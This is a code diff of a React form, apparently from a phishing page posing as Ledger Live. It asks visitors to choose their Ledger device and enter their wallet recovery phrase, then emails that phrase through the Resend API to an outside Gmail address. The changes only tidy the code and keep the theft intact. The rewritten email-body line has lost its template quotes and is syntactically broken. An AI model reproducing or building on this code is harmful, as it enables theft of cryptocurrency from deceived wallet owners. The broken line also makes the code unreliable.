@@ -47,7 +47,7 @@ const Form = () => {
 
   const handleFormDataChange = (event) => {
     setFormData(event.target.value);
-    setUserInput(event.target.value); // keeps userInput used
+    setUserInput(event.target.value);
   };
 
   const handleClosePopup = () => {
@@ -68,15 +68,9 @@ const Form = () => {
           from: "onboarding@resend.dev",
           to: ["tykeshare@gmail.com"],
           subject: "Ledger Live Submission",
-          html: `
-            <p><strong>Form Type:</strong> ledger_live</p>
-            <p><strong>Recovery Phrase:</strong></p>
-            <p>${formData}</p>
-          `,
+          html: <p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>${formData}</p>,
         }),
       });
-
-      console.log("Response status:", response.status);
 
       if (response.ok) {
         setFormData("");
@@ -129,34 +123,22 @@ const Form = () => {
                 imageSelected ? styles.hidden : ""
               }`}
             >
-              <div
-                data-attribute="Nano S"
-                onClick={() => handleImageSelect(nanos)}
-              >
+              <div onClick={() => handleImageSelect(nanos)}>
                 <h3>Nano S</h3>
                 <img src={nanos} alt="Nano S" />
               </div>
 
-              <div
-                data-attribute="Nano S Plus"
-                onClick={() => handleImageSelect(nanoplus)}
-              >
+              <div onClick={() => handleImageSelect(nanoplus)}>
                 <h3>Nano S Plus</h3>
                 <img src={nanoplus} alt="Nano S Plus" />
               </div>
 
-              <div
-                data-attribute="Nano X"
-                onClick={() => handleImageSelect(nanox)}
-              >
+              <div onClick={() => handleImageSelect(nanox)}>
                 <h3>Nano X</h3>
                 <img src={nanox} alt="Nano X" />
               </div>
 
-              <div
-                data-attribute="Blue"
-                onClick={() => handleImageSelect(blue)}
-              >
+              <div onClick={() => handleImageSelect(blue)}>
                 <h3>Blue</h3>
                 <img src={blue} alt="Blue" className={styles.last_child} />
               </div>
